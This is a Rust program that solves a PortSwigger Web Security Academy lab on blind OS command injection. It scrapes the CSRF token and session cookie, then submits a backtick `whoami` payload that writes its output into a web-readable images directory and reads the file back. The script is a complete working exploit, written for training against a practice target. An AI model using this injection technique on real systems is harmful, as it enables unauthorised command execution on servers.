/***********************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 10/10/2023
*
* Lab: Blind OS command injection with output redirection
*
* Steps: 1. Fetch the feedback page
*        2. Extract csrf token and session cookie
*        3. Inject payload into the name field when submitting a feedback to
*           execute the `whoami` command and redirect the output to a text file
*           in a writable directory
*        4. Read the new created file
*
************************************************************************************/
#![allow(unused)]
use regex::Regex;
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a52000b032f742a8282dddb00120026.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!("{} {}", "⟪#⟫ Injection point:".blue(), "name".yellow(),);
    print!("{}", "⦗1⦘ Fetching the feedback page.. ".white());
    io::stdout().flush();

    // fetch the feedback page
    let feedback = client
        .get(format!("{url}/feedback"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the feedback page".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting csrf token and session cookie.. ".white()
    );
    io::stdout().flush();

    // extract session cookie
    let session = extract_session_cookie(feedback.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let csrf =
        extract_csrf(feedback).expect(&format!("{}", "[!] Failed to extract csrf token".red()));

    // the file name to save the output of `whoami` in
    // you can change this to what you want
    let file_name = "whoami.txt";

    // the payload to execute the `whoami` command and redirect the output to a text file
    let payload = format!("`whoami>/var/www/images/{file_name}`");

    println!("{}", "OK".green());
    print!(
        "{} {}.. ",
        "⦗3⦘ Injecting payload to execute the `whoami` command and redirect the output to".white(),
        file_name.yellow(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    let mut injection = client
        .post(format!("{url}/feedback/submit"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("name", payload),
            ("csrf", csrf),
            ("email", "no@hack.com".to_string()),
            ("subject", "hacking".to_string()),
            ("message", "you are hacked".to_string()),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    print!("{} {}.. ", "⦗4⦘ Reading".white(), file_name.white(),);
    io::stdout().flush();

    // fetch the new created file
    injection = client
        .get(format!("{url}/image?filename={file_name}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    // the response contains the output of the `whoami` command
    let whoami = injection.text().unwrap();

    print!("{} => {}", "OK".green(), whoami.yellow());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(15))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}